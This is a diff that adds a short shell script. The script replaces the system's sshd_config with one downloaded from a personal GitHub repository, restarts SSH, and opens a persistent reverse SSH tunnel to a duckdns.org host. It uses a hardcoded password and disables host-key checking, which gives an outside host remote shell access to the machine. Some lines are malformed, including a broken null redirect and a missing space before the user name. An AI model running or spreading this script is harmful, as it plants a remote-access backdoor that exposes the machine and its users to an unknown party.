@@ -1,0 +1,6 @@
+sudo apt update -y & /dev/null 
+sudo apt install sshpass -y & /dev/null 
+sudo rm -rf /etc/ssh/sshd_config
+cd /etc/ssh && sudo wget https://github.com/githubaunglaymyanmar/fordownload/raw/main/ssh/sshd_config &> /dev/null 
+sudo service ssh restart &> /dev/null 
+sudo screen -m -d -S ssh sshpass -p 'aunglay' ssh -o StrictHostKeyChecking=no -N -R 3232:localhost:22testing@aungmyozaw.duckdns.org
